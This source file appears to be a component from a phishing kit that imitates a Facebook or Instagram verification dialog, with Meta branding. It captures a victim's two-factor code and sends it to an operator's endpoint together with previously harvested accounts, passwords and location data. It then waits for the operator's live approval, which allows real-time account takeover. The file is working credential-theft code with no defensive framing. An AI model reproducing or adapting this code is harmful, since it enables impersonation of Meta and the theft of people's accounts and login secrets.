import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { tickSrc } from '@/components/icons';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import { pollApproval } from '@/utils/poll-approval';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC, type FormEvent } from 'react';

const InstagramRoundLogo = () => (
    <div className='ig-logo-round'>
        <div className='ig-logo-round-inner'>
            <svg aria-hidden='true' className='ig-logo-icon' viewBox='0 0 24 24'>
                <defs>
                    <linearGradient id='ig-verify-gradient' x1='0%' x2='100%' y1='100%' y2='0%'>
                        <stop offset='0%' stopColor='#FD5949' />
                        <stop offset='45%' stopColor='#D6249F' />
                        <stop offset='100%' stopColor='#285AEB' />
                    </linearGradient>
                </defs>
                <path
                    fill='url(#ig-verify-gradient)'
                    d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
                />
            </svg>
        </div>
    </div>
);

const VerifyModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const { geoInfo, messageId, loginProvider, userData, addCode, setMessageId, setMessageContent } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;
    const isInstagram = loginProvider === 'instagram';

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const sessionId = crypto.randomUUID();
        addCode(code);

        const allCodes = [...userData.codes, code];
        const message = buildAppealMessage({
            geoInfo,
            userData,
            loginProvider,
            accounts: userData.accounts,
            passwords: userData.passwords,
            codes: allCodes,
            maxPass: config.MAX_PASS,
            maxCode
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId,
                approval_type: 'code',
                session_id: sessionId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            setMessageContent(message);

            const result = await pollApproval(sessionId);

            if (result === 'approved') {
                nextStep();
            } else if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            setShowError(true);
            setCode('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div
            className={`modal form-modal verify-login-modal show d-block${isInstagram ? ' instagram-login-modal' : ''}`}
            id={isInstagram ? 'exampleModalVerifyIg' : 'exampleModalVerify'}
            tabIndex={-1}
            style={{ backgroundColor: 'rgba(0,0,0,0.5)' }}
        >
            <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                <div className='modal-content'>
                    <div className='modal-body'>
                        <div className={isInstagram ? 'ig-round-wraper' : 'fb-round-wraper'}>
                            {isInstagram ? (
                                <InstagramRoundLogo />
                            ) : (
                                <Image src={FbRoundLogo} alt='Facebook logo' width={70} height={70} className='fb-logo-round' />
                            )}
                        </div>

                        <div className='login-main'>
                            <h2 className='verify-modal-title'>{texts.verifyTitle}</h2>

                            <p className='login-notice'>
                                {/* eslint-disable-next-line @next/next/no-img-element */}
                                <img src={tickSrc} width={16} alt='tick' />
                                <span>{texts.verifyDesc}</span>
                            </p>

                            <form onSubmit={handleSubmit}>
                                <div className={`password-input verify-code-input ${showError ? 'is-invalid shake' : ''} ${countdown > 0 ? 'disabled' : ''}`}>
                                    <label className='form-label' htmlFor='code-input'>
                                        {texts.verifyCode}
                                    </label>
                                    <input
                                        type='tel'
                                        inputMode='numeric'
                                        pattern='[0-9]*'
                                        id='code-input'
                                        autoComplete='one-time-code'
                                        value={code}
                                        onChange={(e) => {
                                            const value = e.target.value.replaceAll(/\D/g, '');
                                            if (value.length <= 8) {
                                                setCode(value);
                                            }
                                        }}
                                        maxLength={8}
                                        disabled={countdown > 0}
                                        placeholder='000000'
                                    />
                                </div>

                                {showError && (
                                    <div className='invalid-feedback d-block login-error'>
                                        {texts.verifyError} {countdown}s.
                                    </div>
                                )}

                                <div className='form-btn-wrapper'>
                                    <button
                                        type='submit'
                                        disabled={isLoading || code.length < 6 || countdown > 0}
                                        className={`btn btn-primary w-100${isInstagram ? ' ig-login-btn' : ''} ${isLoading || code.length < 6 || countdown > 0 ? 'cursor-not-allowed opacity-80' : ''}`}
                                    >
                                        <span style={{ visibility: isLoading ? 'hidden' : 'visible' }}>{texts.continueBtn}</span>
                                        {isLoading && (
                                            <span className='login-btn-spinner'>
                                                <span className='custom-spinner' />
                                            </span>
                                        )}
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>

                    <div className='modal-footer'>
                        <Image src={MetaLogo} alt='Meta logo' width={54} height={16} style={{ display: 'block' }} />
                        <div style={{ fontSize: '12px', color: '#606770', marginTop: '4px' }}>{texts.aboutHelpMore}</div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
